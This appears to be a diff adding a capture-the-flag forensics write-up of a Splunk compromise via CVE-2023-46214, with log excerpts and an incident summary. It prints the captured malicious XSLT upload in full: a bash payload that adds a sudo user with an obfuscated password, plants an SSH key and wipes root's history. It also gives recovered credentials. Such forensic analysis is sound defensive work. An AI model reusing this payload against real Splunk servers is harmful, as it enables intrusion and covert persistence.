@@ -1,0 +1,78 @@
+Fragility
+
+In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system. One day, he panicked and reported to us that an important file on his computer had disappeared. Moreover, he also discovered a new account on the login screen. Suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. Can you help us investigate it?
+
+Artifacts given:
+capture.pcapng
+Challenge.7z which gave  '[root]', a directory of the computer infected
+
+Given the packet capture, I used the File - > EXPORT -> Http objects
+
+I found there was a lot of communication to ubuntu:8000 which might just be the splunk server
+
+I also saw with Statistics -> Endpoints that there was some unknown ports being used along with size of communications
+
+
+
+
+T1136 - account creation MITRE attack technique was employed judging by the /var/log/auth.log. We can see account creation
+
+Nginx was a new user created, and it was added to the sudo group
+
+Apr 14 07:59:47 ubuntu sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
+Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/group: name=nginx, GID=1002
+Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/gshadow: name=nginx
+Apr 14 08:00:13 ubuntu groupadd[13358]: new group: name=nginx, GID=1002
+Apr 14 08:00:13 ubuntu useradd[13364]: new user: name=nginx, UID=1002, GID=1002, home=/var/www/, shell=/bin/bash, from=none
+Apr 14 08:00:13 ubuntu usermod[13376]: change user 'nginx' password
+Apr 14 08:00:13 ubuntu chfn[13383]: changed user 'nginx' information
+Apr 14 08:00:13 ubuntu chpasswd[13394]: pam_unix(chpasswd:chauthtok): password changed for nginx
+Apr 14 08:00:13 ubuntu chpasswd[13394]: gkr-pam: couldn't update the login keyring password: no old password was entered
+Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to group 'sudo'
+Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to shadow group 'sudo'
+Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
+
+I believe
+ip.addr==192.168.222.130 might be the malicious IP
+
+In the wirecapture, we see a post request:
+POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1\r\n
+
+If we follow the HTTP stream using wireshark, we can see this file, highly suggesting malicious activity:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
+  <xsl:template match="/">
+    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
+        <xsl:text>#!/bin/bash&#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&#10;echo &quot;nginx:$access&quot; | chpasswd&#10;usermod -aG sudo nginx&#10;mkdir /var/www/.ssh&#10;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&quot; &gt; /var/www/.ssh/authorized_keys&#10;chown -R nginx:nginx /var/www/&#10;cat /dev/null &gt; /root/.bash_history</xsl:text>
+    </exsl:document>
+  </xsl:template>
+</xsl:stylesheet>
+
+
+The attacker used the password: f8287ec2-3f9a-4a39-9076-36546ebb6a93 to backdoor into the account. We decoded the above from base64 (MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm)
+
+The CVE disclosed in this attack was  CVE-2023-46214
+Description
+In Splunk Enterprise versions below 9.0.7 and 9.1.2, Splunk Enterprise does not safely sanitize extensible stylesheet language transformations (XSLT) that users supply. This means that an attacker can upload malicious XSLT which can result in remote code execution on the Splunk Enterprise instance.
+
+
+By following the HTTP stream, we found out that the attacker used username and password to access splunk:
+johnnyC:h3Re15j0hnNy
+
+
+Incident:
+The attack leveraged CVE-2023-46214, a vulnerability in Splunk Enterprise, where malicious XSLT files were not safely sanitized. This allowed the attacker to execute arbitrary code on the Splunk server.
+
+Using Splunk Web UI at http://ubuntu:8000, the attacker uploaded a malicious XSL file via an HTTP POST request: 
+
+The malicious XSL file embedded a Bash script that:
+Created a new user nginx with sudo privileges.
+Added an SSH public key for remote access.
+Cleared traces by overwriting the root user's Bash history.
+
+The attacker also gained access to Splunk using johnnyC credentials potentially harvested during the attack.
+
+Root Cause:
+Splunk's XSLT injection vulnerability (CVE-2023-46214) allowed arbitrary code execution, leading to privilege escalation and the creation of a backdoor (nginx).
+
